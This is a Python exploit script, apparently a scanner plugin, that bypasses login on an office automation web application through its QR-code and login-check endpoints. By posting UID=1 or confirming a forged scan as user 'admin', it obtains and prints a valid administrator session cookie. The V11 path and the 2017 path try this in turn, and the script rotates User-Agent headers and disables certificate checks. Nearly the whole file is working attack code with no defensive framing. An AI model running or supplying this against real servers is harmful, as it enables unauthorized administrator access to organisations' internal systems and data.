'''
@Author         : Sp4ce
@Date           : 2020-03-17 23:42:16
@LastEditors    : Sp4ce
@LastEditTime   : 2020-04-22 16:24:52
@Description    : Challenge Everything.
'''
import requests
from random import choice
import json

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
]

headers={}

def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    #print(checkUrl)
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={ 'UID': int(1)},headers=headers, verify=False)
        resText = json.loads(res.text)
        status = resText['status']
        #print(type(status))
        if str(status) == str(1):

            print('[+]V11 version Get Available Cookie:'+res.headers['Set-Cookie'])
            print('[+]访问{}/general'.format(url))
            return 1
        else:
            if resText['msg']:
                print('服务器返回：{}'.format(resText['msg']))
            return
    except Exception as e:
        print("异常对象的内容是%s"%e)
        return


def get2017Session(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers, verify=False)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']   #获取返回的codeUid
        codeScanUrl = url+'/general/login_code_scan.php'
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers, verify=False)
        resText = json.loads(res.text)
        status = resText['status']
        if str(status) == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid #携带codeUid访问
            res = requests.get(getCodeUidUrl, verify=False)
            print('[+]Get Available Cookie:'+res.headers['Set-Cookie']) #返回的cookie是在set-cookie
            return 1
        else:
            print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable')
            return
    except Exception as e:
        print("异常对象的内容是%s"%e)

print('[*]Usage: [URL]')
def check(**kwargs):
    url = kwargs['url']
    result = getV11Session(url)
    if result:
        return result
    else:
        return get2017Session(url)